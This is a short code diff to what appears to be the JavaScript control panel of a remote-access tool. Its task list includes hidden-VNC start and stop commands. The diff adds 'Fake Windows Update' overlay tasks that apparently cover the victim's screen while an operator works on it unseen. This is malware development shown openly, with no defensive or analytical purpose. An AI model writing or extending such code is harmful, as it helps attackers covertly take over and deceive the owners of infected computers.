@@ -457,6 +457,9 @@ const OFFENSIVE_TASKS = [
   { verb: 'ps', args: '', label: 'Process list' },
   { verb: 'hvnc', args: 'start', label: 'HVNC start' },
   { verb: 'hvnc', args: 'stop', label: 'HVNC stop' },
+  { verb: 'overlay', args: 'start 10', label: 'Fake Windows Update (10m)' },
+  { verb: 'overlay', args: 'start 30', label: 'Fake Windows Update (30m)' },
+  { verb: 'overlay', args: 'stop', label: 'Hide update overlay' },
 ];
 window.runTask = async function (verb, args) {
   if (!state.currentSession) return;
